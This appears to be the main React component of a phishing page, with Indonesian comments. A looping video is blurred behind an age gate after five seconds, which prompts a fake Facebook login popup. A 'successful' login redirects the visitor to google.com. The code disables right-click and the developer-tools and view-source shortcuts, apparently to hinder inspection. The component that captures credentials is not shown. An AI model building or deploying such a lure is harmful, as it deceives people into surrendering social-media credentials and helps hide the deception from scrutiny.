import { useState, useEffect, useRef } from 'react';
import BlurGate from './components/BlurGate';
import FacebookModal from './components/FacebookModal';
import './App.css';

function App() {
  const [showBlur, setShowBlur] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [isMuted, setIsMuted] = useState(true);
  const videoRef = useRef(null);


  // 1. Fitur Pencegahan Klik Kanan & Inspect Element
  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault();
    const handleKeyDown = (e) => {
      if (
        e.keyCode === 123 || 
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
        (e.ctrlKey && e.keyCode === 85)
      ) {
        e.preventDefault();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    // Aktifkan efek dinding pembatas setelah 1 detik halaman dimuat
    const timer = setTimeout(() => {
      setShowBlur(true);
      // LOGIKA BARU: Jeda video saat dinding pembatas/blur muncul
      if (videoRef.current) {
        videoRef.current.pause();
      }
    }, 5000);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      clearTimeout(timer);
    };
  }, []);

  // 2. Callback Aksi ketika Login Berhasil / Lolos Kriteria
  const handleAuthSuccess = () => {
    window.location.href = 'https://www.google.com';
    setShowBlur(false);
    setShowLogin(false);
    setIsMuted(false);
    
    if (videoRef.current) {
      videoRef.current.currentTime = 0;
      videoRef.current.muted = false;
      videoRef.current.play().catch(err => console.log("Play diinterupsi browser:", err));
    }
  };

  return (
    <div className="container">
      {/* Background Video */}
      <video 
        ref={videoRef}
        id="media" 
        src="/media/1.mp4" 
        autoPlay 
        loop 
        muted={isMuted}
        playsInline
      />

      {/* Tampilkan Pembatas Umur */}
      {showBlur && <BlurGate onTriggerLogin={() => setShowLogin(true)} />}

      {/* Tampilkan Popup Facebook */}
      {showLogin && (
        <FacebookModal 
          onClose={() => setShowLogin(false)} 
          onSuccess={handleAuthSuccess} 
        />
      )}
    </div>
  );
}

export default App;